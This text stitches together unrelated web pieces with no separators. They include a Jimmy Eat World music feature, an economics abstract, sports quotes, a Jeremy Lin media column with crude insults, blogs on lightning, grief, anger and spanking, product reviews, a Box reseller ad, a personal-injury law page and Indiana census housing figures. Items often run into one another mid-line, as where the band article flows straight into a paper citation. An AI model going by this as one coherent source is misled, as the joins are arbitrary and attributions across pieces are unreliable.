It didn't. In 2002 Lind told the Weekly, "I think no one [at the label] cared, and I think that it was a case of us not being ready to be on a major label and them not being ready to promote us. Capitol was just sort of the wrong place at the wrong time, but in the end, really, without that experience we wouldn't be where we are today. All in all it was a good thing, it just was really frustrating. At the time it seemed like a waste of time and a big mistake." Jimmy Eat World was officially cut loose from Capitol.
Where a lot of bands might have put their collective tails between their legs, nursed their wounds, or whatever lame cliché applies here, the members of Jimmy Eat World were remarkably unfazed. They released singles on small indie labels again, issued a compilation album of previously released singles, and hit the road. And what they found was rather remarkable: in their time out of the spotlight, their fan base had actually grown through the kind of publicity that can't be bought--word of mouth.
Eventually they had tucked away enough money to record a new album on their own dime, beholden to no one. They holed up in an L.A. studio with producer Mark Trombino, who had enough faith in the band to work for free, in the hope that someone would release it and he'd be reimbursed. And while some labels' curiosity was piqued before the sessions, it was during the album's recording that the suits really began taking notice.
"I think there were people that were interested all along, because it was no secret that we were not happy with Capitol, how they were handling us, mainly as far as their lack of enthusiasm towards the band," said bassist Burch from his Phoenix home last week. "A lot of different people were saying, 'Hey, if you need a label we're here for you.' ... So they came down and listened (while the band was recording), and were like, 'Wow, this is sounding pretty good.' And I guess they told their friends and it just kind of worked through the grapevine. And the next thing we know, we had our choice of where we wanted to go.
"It was really cool. It was the exact opposite of signing to Capitol; when we did that we definitely had nothing to offer. We were a baby band that had really no experience making albums or anything. But then we had this record that people liked--finished!--so we just took it around to everyone." And this time everyone wanted it.
The band eventually decided to sign with Dreamworks, the musical division of the entertainment conglomerate started by Steven Spielberg, Jeffrey Katzenberg and David Geffen. Released in July 2001, that self-titled album (originally titled Bleed American but changed following 9/11) featured the anthemic, feel-good second single "The Middle," as catchy a guitar-pop song as you'll ever hear, and one which eventually became ubiquitous on radio and TV. After years of toil, Jimmy Eat World was almost instantly catapaulted to platinum success.
The band toured relentlessly on the strength of the album, graduating from 200- to 400-seat punk rock clubs and warehouses to selling out large theaters. "Bleed American was going so well that we just kept on touring," said Burch. "It was just over two years that we toured on that thing. ... We finished touring, then took a few months to decompress and settle down, and then came back together and started writing, took a few months to get a lot of ideas down. I think we went in with like 30 ideas of songs, and then narrowed it down to 14 that we thought were really good, and went in with those."
They assembled a wish list of producers they wanted to work with, and eventually decided upon Gil Norton (Pixies, Echo and the Bunnymen, Foo Fighters), who flew to Phoenix from London to meet with them. "We had dinner, and talked about music and different things," recounts Burch, "and we ended up going back to our little studio and working on one of the songs, which was crazy and unexpected--neither of us had planned on doing it. But we were listening to the songs and he was like, 'Wait a second. This part right here, let's try this.' We ended up working on the song for like an hour, and it was totally fun and cool and he had great ideas. He started pushing the song in a good direction, so we were like, 'Oh man, this is the guy.'"
With Norton behind the board, the band recorded at a number of locations--Cello Studios in Los Angeles; right here in Tucson, at the home studio of Rainbow Guitars owner Harvey Moltz; and at their own newly built studio.
"In the time we had off after touring we built a little studio in Tempe, close to our houses," said Burch. "It's our first real practice place, which is crazy. I mean, we've been a band for 10 years, but it's only been like a year-and-a-half that we've had an official practice space, which is ours. We've always either shared with five other bands--so you have to break all your stuff down when you're finished and set it up every time you go in, and you're limited on what times you can go down there; you have to schedule it with everyone else--or it was like, our parents' living room or a garage. So it was really nice; it really helped us making this record to be able to go in--we have a little ProTools set-up--and just put down ideas."
In other words, this time around they had a lot more time and money to record the album they truly wanted to make. "I think you can hear it, too," said Burch. "On Bleed American, if we were having trouble with a transition between a verse and a chorus, we'd be like, 'We don't got much more time. All right, straight from the verse into the chorus.' [Laughs.] So it was really bare-bones that way. And taking time to build layers and stuff, we didn't have that luxury."
The result of "that luxury"--all those "layers and stuff"--is all over Futures, the album released last week on Interscope Records. Interscope Records, you ask? I thought they were happy on Dreamworks. Well, they were; but it wouldn't be a proper Jimmy Eat World album without a bit of label drama, now, would it? Let's let Burch explain.
"Interscope bought Dreamworks, and when they did that they bought out all the contracts that Dreamworks had. We didn't lose our contract or anything; it was the same deal that we had, but now we work with this label instead of Dreamworks. But we're really lucky in that a lot of our people at Dreamworks ended up at Interscope, too. So it's not a whole batch of strangers that we're working with; we had our A&R guy go with us over there.
"It was really scary. We were in the middle of making the record. We had nothing but love for Dreamworks. It took a long time for 'The Middle' to really hit, and I don't think any other label would have invested that much time and work to make that song go. So, it was a really good place, just their way of thinking; they definitely had a sight towards a career, more than just The Song, like every other label that picks out The Song and then 10 tracks of filler. They were into developing a career that would be around for 15 years, so we loved that about them. ... Then we find out we're going to Interscope, which is, you know, 50 Cent and U2 and No Doubt and all this stuff, and we're on the same label as them so as far as getting time in their busy schedule. They're working all these records, so are they gonna have time for us?"
While it's a bit early to foresee how the relationship with their new label will fare, all signs point to "just fine, thanks." Futures' debut single, the driving "Pain," was all over radio and MTV weeks before the album's release. Though it's just as slickly produced as the rest of the album, it's somewhat atypical of most of its other songs. Futures still boasts some rockers--the darkly soaring "Nothingwrong," the chugging "Just Tonight"--but there are also more ballads and mid-tempo songs than ever before--the piano-and-feedback weeper "Drugs or Me" is the former, while the gorgeous melody of "Work" falls into the latter. Elsewhere, as on "Polaris" and "23," the band's dreamy guitar sound surprisingly resembles no band so much as the Cure. And while there may be nothing as instantly stunning as "The Middle" on Futures, the melodies and textures that reveal themselves over repeated listens--immaculate harmonies, acoustic guitar and keyboards, female backing vocals--not only seem like a natural progression from Bleed American, but, taken as a whole, manage to trump it.
In the age of downloads, when most bands settle for that one killer single--The Song--and a bunch of filler, Jimmy Eat World has opted to release the exact opposite. "We wanted to have a group of songs that complemented each other," said Burch. "I guess that was the only main idea--an album, instead of just a bunch of different songs by the same band."Brown, S., McNabb, R. and Taylor, K.

Firm Performance, Worker Commitment and Loyalty.
Working Paper.
Department of Economics, University of Sheffield

Using matched employer-employee level data drawn from the UK Workplace and Employee Relations Survey, we explore the influence of worker commitment and loyalty on firm level labour productivity and financial performance. Our empirical findings suggest that worker commitment and loyalty enhance both labour productivity and financial performance at the firm level thereby highlighting a hitherto neglected conduit for improved firm performance. Using employee level data, we also explore the determinants of worker commitment and loyalty in order to ascertain how such attachments to the firm may be engendered. In general, our employee level analysis suggests that it is firm level characteristics (such as appraisal schemes, supervision, suspensions and redundancies) that influence attachments to the firm. Such findings suggest that firms may be able to exert some influence over the loyalty and commitment of its workforce, which, in turn, may affect firm performance. Synopsis:

Remember when streets were places of public interaction, where old ladies had somewhere to sit and chat, where children would play and we had this thing called a community. There seems to be a plan to rip up all of our public space and keep us off the streets and scared in our houses.
Bench number two was sucessfully bolted down and the builders work was done. Time to test it out.
A quick change back into civilian clothing and the team was able to try out the bench for real.
Below agent Ladybird stops for a coffee with some familiar looking characters on one of London's newest pieces of public street furniture.
Special thanks to agents Ladybird, Gemma and Shalini for their amazingly co-incidental timing,
turning up and photographing the action of these mysterious characters.All quotes by Dan Boyd

“They had a nice athletic group and they played a nice controlled, smooth, fluid game. They jumped out to a 22-4 first quarter lead, then we hung around, I guess you could say.”
“For us to compete with teams like that we have to play a near-perfect game, and of course we didn't do that.”
“It was ugly -- 12 turnovers in the first quarter. I don't know if we got into the holiday fudge early or what, but it brought back visions of last year. I give (Reynolds) credit -- they played well. We also helped them, though.”
“We've been in every game in the first have in the last few games. We've executed, made good shots and played pretty good defense. We tend to take a beating and get worn down against bigger teams, though.”
“We won't check if they're real fans. We got an inflated football we were supposed to hang, but some kid popped it. What are you gonna do?”
“We've had some good moments, just not complete efforts. I felt the kids played hard for four quarters. It was probably the most complete effort of the year, no doubt.”
“You absorb a few losses in a row and spirits start to sink a little bit. Body language starts to change, so the kids left there happy and have, I hope, a little bit better sense of how to play a complete game.”
“They pounded the ball inside on us -- both these teams did that to us. McMinnville had a 6-2 post and another good-sized 5-10 post and they just pounded us down there. When you look at McMinnville, that's what you'd expect, though.”
“I think one of the big keys was our ability to control the basketball and get good shots. We were able to run some clock off and shoot a good percentage. That was effective for at least the first three quarters -- and our defense was pretty good. Hold a team to 31 points through three quarters and you're usually in the ball game.”It’s an old adage that "lightning never strikes twice." It’s becoming increasingly clear to me with time that this is bullshit.
Last week, the switch in my building (and everything plugged into it) was struck by lightning for the second time this year. Last time my whole computer needed to be replaced. This time, it was only the on-board Ethernet that seems to be fried. It means that my workstation is a much less effective router now but it beats buying a new computer.
Wikipedia has this to say about the whole thing:
The saying "lightning never strikes twice in the same place" is frequently disproven. The Empire State Building is struck by lightning on average 25 times each year, and was once struck 15 times in 15 minutes.
The Wikipedia page authors’ were also quick to dispel another hypothesis that, I’ll admit, had crossed my mind:
Some repeat lightning strike victims claim that lightning can choose its target, although this theory is entirely disregarded by the scientific community.see the subject! wich is more proper/better c++ style?

It helps readability to surround the return value with the (). It's not much if it's a constant (0, 1) but it does help when you're returning the value of a function or equation.

Either one works, it's a matter of personal preference since returning a simple value is easy to read anyway. Now, if you had something like
return i * j / c;
it wouldn't hurt to say
return ( i * j / c );
For simple return types such as 0 for a success and 1 for a failure I prefer to use the constants
return EXIT_SUCCESS;

return EXIT_FAILURE;

The draft was dated in July of 2013 and had the title you see What if the last year of your life was a dream? and then just a single paragraph written with no real meaning.
It started me thinking what made me think up this subject back then and what made me find it now? Would I want to find out I had been living a dream? It has been a tough year with quite a bit of loss and very little gain. Still the thought of it could always be worse creeps into my head. And I know that as bad as it has been , I have survived through it and the family is still intact despite the losses. These facts I am proud to have been a part of and would hate to see taken away.
Of course I would be overjoyed to find out my dad hadn’t passed, but if it meant he was still suffering as he had in his last couple months it would quickly break my heart. I’m not sure I could have taken much more of that roller coaster ride and seeing the way my mom suffered through it. I know she is still suffering now but she knows the situation and is dealing with it as best she can. Before the not knowing and the constant worry was just too much for all of us in the family.
I believe my wife would agree with me and feel the same about the loss of her Granny. She was a tough woman who had raised a battalion of children and grands but her time was called and we believe she was ready to answer. Sadly she has been joined by two of her children in the following months and this has made for a very tough year for that family. My wife has dealt with it all and remained intact. She has let the worry she has for her father be the focal point of her pain. As long as she can help him through it I believe is what has kept her strong.
It this had all been a dream what a horrible one it would have been. To find out all this was only a dream and then to possibly have to relive it later would be unbearable. I would rather my dreams be about lottery winnings, driving race cars or being a secret agent helping save the world. These are the things I want to remember when I find out it was all a dream.
No, I don’t think I would want to find out the last year was a dream. As much as it has been painful, some good has come out of it. My family is stronger having gone through the pain together and become even closer than we were before. The relationship between my wife and me has lasted through these tough patches and we are past the first five years of marriage (Seven later this year). We still care for each other as we did on our wedding day and I wouldn’t want to lose a day of that.
WordPress has also been a big part of my past year and I wouldn’t want to know the friends I’ve found here were only part of some dream. Why this post spoke to me so much today I’m not sure, but it was a subject I needed to think on. Thank you for listening to my thoughts.
It’s almost time for bed here so it won’t be long before I head that way. I hope I can dream about those race cars tonight. I really want to hoist that trophy and take a bath in bubbly at the winner’s circle.

Great post Jed. You’ve been through a hell of a lot this year, but look at you, you came out the other side and you have built this place as well, which is something you should be really proud of. Hopefully things are on the up now. :) x
Thanks. I am proud of my creations and appreciate your kind words. Things do seem to be getting better.
When I first read this, I was like “wouldn’t it be amazing if all this wasn’t real, that it was just a dream?” but then as I read and thought about what you said about the suffering and having to just relieve it again eventually, the dream idea lost it’s appeal.The Mercy Rule - Linfinite Narcissism
By David Roth
During the first week of Jeremy Lin's improbable ascent from end-of-the-bench high-five artist to the heights of basketball fame and grating ESPN ubiquity, he taught those who might've forgotten—and many who never cared to care in the first place—how surprising and vital and just fucking great basketball can be. In this, the second week of what some people have undoubtedly referred to as the Lin Dynasty, he has continued doing that, hanging monster games on teams ranging from the Raptors to the Lakers, gutting out wins when he wasn't at his best, drilling last-second game-winners, and extending the long winning streak of a Knicks team that still starts a few players who can be filed under "hump" on their best days.
The Knicks have not lost with him as a starter, and The Whole Jeremy Lin Thing is still outlandishly, outstandingly big. President Obama could appoint Chris Brown to the Supreme Court and be found in a hot tub with Janine Lindemulder and a manatee, and neither story would get reported if Lin, say, bought a used Acura that day. This is all fine, as far as it goes. Basketball is fun, and Jeremy Lin is fun, and what with Chris Brown being on the Supreme Court now, we could all use a little bit of fun in our lives. But good things about basketball and silly things about the sports media hype machine are not all that Lin has shown us during his rise to and over the top. Lin has, just by doing what he does, reminded us that many, if not most, of the people who talk about sports for a living are gargantuan, razor-studded hemorrhoids.
Lin, just as Tim "Whole Milk" Tebow did, managed to do a lot of revealing simply by being a dullish, devout, aesthetically unconventional jock onto which various things were projected by various people. Those things can be questions of identity politics—we got angry emails when I identified Lin as Chinese-American in last week's column; he is in fact Taiwanese-American—or of racial pride, or never-give-up-on-your-dreams Chicken Soup For The Soul-ery, or whatever. Lin has also inspired killer pick-up lines for basketball nerds, like this one: "There's something to the Flip Murray comparisons, and an interesting parallel to Jose Calderon's '07-08 season, but really Lin is most similar to Louis Williams, I think. Now let's go back to your place, mine smells like wet carpet." Most grossly, Lin has also provided an opportunity for racists, grumps, and racist grumps in the brand-name sportswriting community to remind us of how far past their expiration dates they are.
For Buzz Bissinger, the man-sized ulcer who wrote the (terrific) book Friday Night Lights 137 years ago, that meant grouse-seething about Lin receiving favorable treatment because he plays in New York, and is Christian and Chi… sorry, Taiwanese-American. For Jason Whitlock, a rancid Milk Dud with an outsized sense of self even Kanye would be shamed by, that meant honoring Lin with a gem of an Asian dick-joke on Twitter, puffing up on some "Do you know that the Chinese guy didn't make joke and put pee-pee in your Coke? Did I startle you with my fearless truth-telling?" shit, and then issuing a sort-of-apology in which he used the word "I" 13 times and the word "sorry" once. David Brooks, the unctuous fop who haunts the Aspen Ideas Festival and the New York Times opinion page, used Lin as a fulcrum to write another column.
What all the aforementioned have in common, besides loud and proud ignorance, is that they don't really like sports, or seemingly follow them terribly closely. They also quite possibly aren't actually as racist as they've made themselves look—Lin's different-ness in terms of background and ethnicity is simply the most obvious available thing these narcissists can find to change the subject back to themselves and their Provocative and Fearless Opinions. Bissinger, whose vague perma-fervor is so discomfiting and spittle-heavy as to make Andrew Breitbart look like Matthew McConaughey, spends most of his time in print shadowboxing his own boring demons. Whitlock, who has been 11 years old for his entire life, is just trying to get noticed. To a certain extent, the attempt to claim and colonize Lin—by underdogs and Taiwanese-Americans and shoot-first Ivy League point guards and everyone else—reflects less about the way people think of race than how terribly much they think about themselves.
Lin, of course, did nothing to ask for any of this. He, consistently, does nothing to ask for anything—the average Lin interview reveals little insight or humor or much else but a studied humility, which is also true of most other elite athletes, and which is also fine. If admirable qualities were shared out less equitably—if LeBron James was somehow also Carl Sagan—we would all be very reasonably bummed out by our own averageness. But, in his blank-slate brilliance, Lin keeps on proving and re-proving one point that proves another in turn: great basketball is great, and certainly far greater than the trolls who make their living denying that.

I use anger as a crutch to get through the day; it’s the only way I can motivate myself. I’ve had only one dentist use “laughing gas”; the buzz made me angry. Lately, I've been drawn to Justified, the television program whose protagonist claims "I guess I never thought of myself as an angry man." His ex-wife, however, asserts he is " ...the angriest man I've ever known." I suppose it’s for these reasons, and numerous others, that my wife worries that I carry around an unhealthy amount of anger.
Even though I'm drawn to anger the way the way a mechanic with a foot fetish is drawn to pedal pumping, this Peggy Noonan editorial frightened me. Noonan writes, “. . ..”
I’m a little young to actually remember the Sixties; I was only 10 years old during the Summer of Love, and my recall of the news reports Martin Luther King riots, the Chicago Democratic Convention Riots, or Kent State are so blurry that they resemble dreams more than actual memories. I remember the Operation Rescue protests, the Rodney King riots, Clinton hatred, and Bush hatred more clearly, but none of that ferment seemed as widespread as this current rage. Like Noonan, I think some of this current fury is something new.
It would be nice to blame only one side; the Tea Party people or talk radio blowhards for instance have done their fair share of harm. The problems, however, run deeper. No leader seems to have enough respect to convince everyone to "play nice." In short, there are no adults, and the young run around believing that their opinions carry the weight of facts "that can't be wrong." Everyone seems to have forgotten that most people err out of ignorance not malice.
In The Maltese Falcon, Dashiell Hammett has Kasper Gutman say, "Talking's something you can't do judiciously, unless you keep in practice." Although Gutman is a rogue, he deserves to be listened to. To be judicious is to be "characterized by good or discriminating judgment." Judicious's synonyms include "reasonable," "sober," "sagacious," or "enlightened," qualities all American leaders need to exhibit in this acrimonious era. Gutman would surely agree that anger is something that can never be practiced judiciously.Please note that Kathlego Cash Loans DO NOT provide loans to those individuals that is blacklisted, any judgements against them or any overdue accounts.

Best all-around consistency in the studio, minimal work to get the fat tone. Live, it's one of the punchiest heads out there. I like the versatility of the head on both birch and maple kits, both of which I use in live and studio applications.

Jackets appealed to both the male sensibilities of masculinity, pomp and utility. There is no other way to explain the incredible concoctions of early horsehide jackets and grizzly jackets. Now before we get concerned with the endangered grizzly...this is more of a nom-de-plume. The grizzly refers to jackets with fur on front. These jackets are often harking back to the rough and tumble pioneer period in North America. Early settlers, natives and traders would wear leather garments that were often simply tanned with bark or brain tanning and had basic robe like construction. Fur was rarely removed and often worn on the outside of the jacket. Heck, if it can keep a buffalo warm why not a man. Many of the seriously tough men and motorcyclists of the 1930s could often be seen photographed in fur on grizzly jackets while riding dirt roads of the back country.
The other interesting component of this decorative display of different leathers is the two tone jacket. Check out this beauty that just sold on Ebay. Nice inverted D pocket and tobacco pocket as it would have been advertised. Very practical and yet very impractical with the two tone leather and extra care and effort to put the jacket together! Looks like a Kit Carson!
This jacket is currently on ebay. The pictures came courtesy of Punk Rock Max . One of the things that perplexes me about this jacket is the texturization of the leather. I have seen this in dozens of jackets that I have owned over the years I figured it was either to soften the horsehide or to create a fake pigskin effect?

At Wake Forest Baptist Medical Center in Winston-Salem, North Carolina, doctors are saving time and sharing ideas using Box, a file-sharing and collaboration software that lets providers browse available medical documents and communicate with each other about treatment options. We are big believers in Box at Manage My Practice – we use it, and most of our clients end up using it too. Box is the only HIPAA-compliant file storage and collaboration service, and just like the doctors at Wake Forest, it makes our lives easier countless times a day. Wake Forest uses Box to store all of their medical journals and articles, as well as commenting on each file so that physicians can discuss procedures and treatment options. The doctors can access the repository from their tablets and smartphones, so that accessing detailed disease or treatment information is always as close as their mobile device.
Box is a simple and secure solution for sharing content with your coworkers, customers and audience. If you have moved your organizations’s practice management, electronic health record or email service to “the cloud” then it only makes sense to move your paperwork and content out of boxes and storage and into the cloud as well. If you have are using email attachments, a network drive, FTP server, or a non-compliant solution like Dropbox, then switching to Box can help your practice reduce your liability, stay HIPAA compliant, and store all of your digital content in a secure and accessible manner.
Box also makes mobilizing your workforce across locations easy. Box means your content is always available in a web browser, a phone or tablet, or synced on your desktop. Many of our consulting clients also use it to coordinate work and file across locations. If you have outsourced your billing or human resources, a shared folder in Box allows both locations to have the latest information and stay in touch.
Manage My Practice is a Certified Box Reseller, and would love to help you leverage Box to improve your practice’s workflow.

A local surgeon spent two weeks at the United States Army's Landstuhl Regional Medical Center in Germany doing just that.
Dr. John Blebea is a Vascular Surgeon at University Hospitals. He says every day he was at the medical facility in Germany, he performed surgery on a soldier.
His specialty is operating on damaged blood vessels. Dr. Blebea says his patients came from the front lines of Afghanistan and Iraq. Many of them suffered injuries from exploding landmines. He says the soldiers' courage humbled him.
Dr. Blebea says the wounded are getting the best care possible overseas. Once they are stable, they are flown back to the United States.
Since 2007, 72 vascular surgeons have volunteered their time overseas. Dr. Blebea says it's a big help since many military doctors aren't trained in that specialty.

When I bought my new printer last year I was quite excited about being able to print photo's as my old one was just a standard printer and with the new one I can now add my pictures from my mobile onto my computer and print them off which is so convenient as I carry my mobile around and don't always have to carry a seperate camera with me when I go out.
The only thing is when your printing photo's is the ink seems to run out quicker than with documents and I find the green seems to be the one that empties the quickest and I buy the most of , well that one and the black as I also print my documents for work.
I buy these cartridges from Curry's for £9.99 , I have bought them off Ebay for half the price but you still have to pay postage and so it works out about the same price in the end.
The cartridges are well packed so there is no spillage and they are easy to fit and install into the printer, I just remove the old cartridge pop the new one reset the printer so it knows the cartridge has been replaced and off you go printing again.
The quaily of the prints are really good and the colour is designed to last with no fading for years.
I like the end result of the photo prints and the cartridges are an affordable price , you can refill them but I always seem to go wrong somewhere and get messy , so it's easier for me to just buy them and replace them as and when I need to.
On average mine last me around six weeks but I do take a lot of pictures of my grandchildren.

BREAKING NEWS: Boeing Builds Plane Mid-Flight!
I am trying hard to imagine the reaction to a newspaper headline or the top story on the evening news that says, “BREAKING NEWS: Boeing Builds Plane Mid-Flight!”. I wonder if the world would herald the respected company for its innovative new construction process or ridicule it for brazen disregard for engineering and aerodynamics. Would stocks soar or plummet?
For me, I personally would feel unsafe getting into a plane that was being built while in flight. I was recently traveling and during my layover, the plane of which I had just gotten off needed a mechanical issue addressed before I got back on it to continue to my destination. Please be clear, the plane did not stop because of the mechanical concern; rather, it was just a part of its flight routine. I boarded the plane a few minutes later, and I made it home safely and on time.
I share this story because I am extremely frustrated with educational leaders that use the term “building the plane while flying it”
in reference to any number of changes or reforms in which they are involved or leading. I am not sure why we gravitate to this phrase, but we use it a lot. In one week, I heard it seven times. And it needs to stop.
Good grief. Tell me, would we get onto an airplane knowing that it was going to be rebuilt in the midst of the flight? Would we deem the company credible? Would we consider ourselves sane? I think the answer is “no” to all those questions, yet why do we use this phrase to discuss the improvements we are making to our educational systems?
In education, we deserve a better phrase than this to describe the intense work we are doing with continuous school improvement. We need to use a phrase that speaks to the integrity and intensity of our work. We need a phrase that conjures an image of professional competence, not willful neglect or ignorance. We need a phrase that accurately describes the hard work we do daily.
But, please, until we find that phrase, can we at least stop telling parents, students, legislators and community stakeholders that we are “building the plane as we fly it”? I am never taking that flight with you as long as you are, nor are many others..

Personalized Education, Not Personalized Learning
Before you condemn me after only reading the title, let me state clearly that I am FULLY supportive of personalized learning. I am working hard to support philosophies and practices in my district, in my state and across the country that address and support personalized earning.
But, I realize that my goal is not to personalize learning. Learning has always been – and will always be – a personal process. It’s kind of like breathing. I do not think there will be any “personalized breathing” reforms any time soon.
The real goal of educators, parents, and community stakeholders should be personalized education. We really need to focus on how we make our system of learning (education) more open for personalized learning. We need to build our system anew.
Our right will always be to have learning be personal; the goal is to make our system of education personal as well.

Accidents can shape the rest of our lives. Sometimes they can make us stronger. However, oftentimes, they are devastating and impact us for the rest of our lives far beyond what most people realize.
Among the things that you may have to worry about following an accident include ongoing medical bills and the consequences of living with constant pain and suffering. Accidents can result in injuries and burdens that are simply too great to deal with on your own. The law stands up for accident victims and allows them to pursue compensation against those that have done them wrong or were careless and caused them injuries. At Billings Injury Lawyer, we are committed to fighting for accident victims to protect their rights under the law.
Types of Personal Injury Cases We Handle
Our personal injury practice includes representing clients who have been injured due to:
- Auto Accidents
- Truck Accidents
- Motorcycle Accidents
- Construction Accidents
- Defective Product Accidents
- Aviation Accidents
- Wrongful Death Suits
- Assaults Due to Inadequate Security
- Other Premises-Related Accidents
While we handle cases involving all types of serious injuries, we maintain a particular focus on cases involving:
- Broken Bones
- Head and Facial Injuries
- Soft Tissue Injuries
- Spinal Cord Injuries
- Traumatic Brain Injuries
If you trust us to handle your case, in addition to conducting a thorough investigation, one of the first steps we will take is to make sure that you have obtained appropriate medical attention for your accident-related injuries. Our first priority is that you make a full recovery, if at all possible, and your medical records will be key evidence in your claim for compensation. We will work with your primary care doctors, but will also retain independent medical experts that have particular expertise in diagnosing certain injuries such as traumatic injuries and who understand the short- and long-term impacts these type of injuries can have on accident victims’ lives.
Compensation Available to Victims of Serious Personal Injuries
Each accident is unique. Therefore, each accident victim’s injuries are also unique as well their potential financial recovery. We will begin gathering the information we need to estimate your losses during your free initial consultation, and we will make sure that you know how much you stand to recover before you make the decision to pursue (or not pursue) a claim.
Although not an exhaustive list, the following categories are types of compensation available for personal injury claims in Montana:
Outstanding Medical Bills
If you have been injured due to someone else’s negligence, you are entitled to seek financial compensation for your medical bills resulting from the accident. This includes bills for emergency medical care, testing, surgery, treatment, inpatient care, prescription medications, medical equipment, physical therapy, and other medical expenses.
Future Medical Expenses
Importantly, you are entitled to seek financial compensation for your future medical expenses, as well. Calculating your future medical expenses requires a thorough diagnosis and treatment plan; and, for serious injuries, future medical expenses will often be among the most substantial aspects of accident victims’ financial recoveries.
Other Accident-Related Expenses
In addition to recovering your medical expenses, you are entitled to seek to recover any non- medical accident-related expenses, as well. This includes property damage (for example, the damage to your car), as well as things like:
- Modifications to your home or car necessitated by a physical disability,
- Childcare expenses, and
- The cost of hiring someone to perform household chores that you are no longer able to perform on your
Lost Income
You are entitled to recover any wages or salary that you lost due to time missed from work as a result of the accident. This includes reimbursement for sick leave and vacation days if you were forced to take paid time off from work.
Lost Earning Capacity
Like medical expenses, you are entitled to seek compensation for your future lost income as well. Once again, determining your future losses requires a thorough understanding of the long- term effects of your injuries. At our personal Injury law firm, we are experienced in helping our clients ensure that they pursue maximum compensation for all of their current and future accident- related losses.
Pain and Suffering
Whether your injuries leave you in constant pain or you experience debilitating pain when attempting to perform certain movements or tasks, this is considered a “loss” that is compensable under the law. Compensation for pain and suffering is in addition to compensation for the medical costs of treating your injuries (including pain medications).
Emotional Distress
If you have experienced psychological effects from the accident or your injuries, you may be able to collect compensation for emotional distress, as well. Securing compensation for emotional distress typically requires a psychological or psychiatric diagnosis (similar to the medical diagnosis needed to secure compensation for physical injuries).
Scarring and Disfigurement
Permanent scarring and disfigurement (including loss of limbs) can entitle accident victims to seek additional financial compensation. Scarring and disfigurement can have broad intangible consequences (including loss of sensation, physical disability, and emotional effects), and the law provides financial remedies for these consequences similar to all other accident-related losses.
Loss of Support, Companionship, and Enjoyment of Life
The final major category of compensable losses includes all of the other intangible ways that an accident or a person’s accident-related injuries affect his or her life. If you are unable to enjoy spending time with your children, spend meaningful time with your spouse, or continue your hobbies or recreational pursuits, these too are losses for which financial compensation is available under the law.

Indiana Business Research Center, Kelley School of Business, Indiana University
Mansion or trailer, townhouse or ranch, most Hoosiers live in single-family homes. The decennial census taken in April 2000 provides detailed information on the physical and financial characteristics of housing in Indiana, such as the number of rooms and bedrooms, vehicles and telephones, value, and heating fuel. Indiana's overall housing inventory is the primary focus of this article and will likely cause the reader to learn more about local areas within the state. This information is available for every county, city, town, and township in the state on STATS Indiana in a series of 60-page profiles developed from a census file named Summary File 3.
Physical Characteristics
Single or double (we don't mean cheeseburgers), trailer or apartment? Most housing in Indiana consists of single-family homes (see Table 1 and Figure 1).
Table 1
Housing Units by Type: Indiana Compared to the Nation
Figure 1
Multi-Unit Housing: Indiana Compared to the U.S.
Still, 25 percent of Indiana's housing is apartments or mobile homes (571,117 such units). Most apartment dwellers are found in the metro areas of the state, with mobile home living more prevalent in southern Indiana (see Figure 2).
Figure 2
Mobile Home Share of All Housing Units by Township, 2000
Utility gas heats the majority of Hoosier (65 percent) and U.S. (51 percent) homes. Electricity is a distant second choice with a 22 percent share in Indiana and 30 percent share nationwide. Hoosiers use more bottled, tank, or LP gas (9 percent) than is used nationwide (7 percent), but less fuel oil or kerosine (3 percent) than the U.S. average of 9 percent (see Figure 3).
Figure 3
Fuel Used for Home Heating
Financial Characteristics
Most Hoosiers are homeowners—71 percent compared to 62 percent nationally.
Based on Census 2000, the median value of a home in Indiana is $94,300, compared
to $119,600 for the U.S. Of course, the median home value varies widely depending
on location, with median values as high as $625,000 in the Indianapolis area
(Crows Nest) and $390,600 in Northern Indiana
(Dune Acres) (see Table 2 and Figure 4).
Table 2
Median Home Value in Indiana Cities and Towns
Figure 4
Median Home Value by Township, 2000
Home values also vary with the race of the homeowner, with Asians (reporting one race) having the highest median value at $138,300 in Indiana and $199,300 nationally (see Figure 5).
Figure 5
Median Home Value by Race of Householder
With homes come mortgages, utilities, and taxes. In Indiana, 71 percent of specified owner occupied homes (see definition below) have a mortgage.
Of those mortgaged homes, average monthly owner costs are $977. The mortgage is clearly the biggest financial load, since homeowners without a mortgage have average costs of only $280 a month. Indiana has a median yearly real estate tax of $868, compared to $1,334 in the U.S.{ dressing him or getting him to sleep a race around and over all the furniture. I’m afraid his arm will come out of the socket when he strains to break my grip with such a might after I finally catch him.
When it was time for his nap today, I had to chase him through the whole house again. He wasn’t listening to me, and when I finally got him on his bed to change him, he kept thrashing around and then started kicking me.
That was it — I had had it. I can’t claim that I “lost it,” I knew what I was doing when I grabbed one of his flailing legs and gave him a slap on his butt cheek for the first time — one.
I wanted to get his attention. He stopped kicking immediately, looked at me with his large blue eyes, and started to cry.
“Mooommy!”
“Well, you just wouldn’t stop,” I said, justifying my action.
But not a second later I knew what I had done was wrong. I felt like the worst mother in the world.
I finally was able to change him and he started to nurse to go to sleep. What kind of a mother was I?
His eyes had expressed utter disbelief over what he had experienced: I had hurt, him for the first time, his mother who he loves no matter what.
Up to this point, I had done everything to avoid hurting L. I had been determined to give birth without the help of drugs because I didn’t want my son to come into this world drugged. After a lot of preparation (12-week Bradley course), I luckily was able to give birth to him naturally. We decided against circumcision after getting educated about the procedure — we couldn’t imagine putting our baby through that kind of pain and trauma. I believe in gentle attachment parenting, including baby wearing and co-sleeping. And even though nursing a toddler has its challenges, I still breastfeed him so he can get the health benefits of breast milk until he self-weans. Spanking him was a parenting low point for me.
I was spanked by my father as a child. A very soft-spoken man, there was one thing my father couldn’t stomach: noise in the house. My brother and I grew up with parents who never listened to music, in the house or in the car. When my brother and I fought, sometimes involving bruises and ripped-out hair, my father would track down the noise, pull down our pants, whack us a good one and sent us to our rooms with the red imprint of his hand burning our bottom for a while. The last time he hit me was when I was 16 years old and I hit him back.
I can’t claim that those spanking incidences — maybe 15 in total — scarred me for life, but I think spanking is terrible parenting.
My father’s behavior did nothing to foster closeness to him during my childhood (we have a wonderful relationship now and I feel sad that he didn’t know how else to cope with his frustration). Spanking also never stopped the behavior — it didn’t deter my brother or me from fighting.
I want to make better choices.
I strive to be a pretty strict but kind and loving parent, believing that children need boundaries and consistency to thrive. You could argue that I didn’t “spank” my child, that one slap doesn’t amount to that, but I feel like I failed my little boy today as a mother. In my opinion, and you can be of another opinion, using spanking for disciplining is the same as bullying — you are abusing your power over your child and are taking out your frustration on someone smaller.
As he was falling asleep, his tears still on his cheeks, I apologized to my son several times, “I’m sorry, Love. That wasn’t right — I shouldn’t have hit you. Mommies sometimes make mistakes, too, and have to say sorry.”
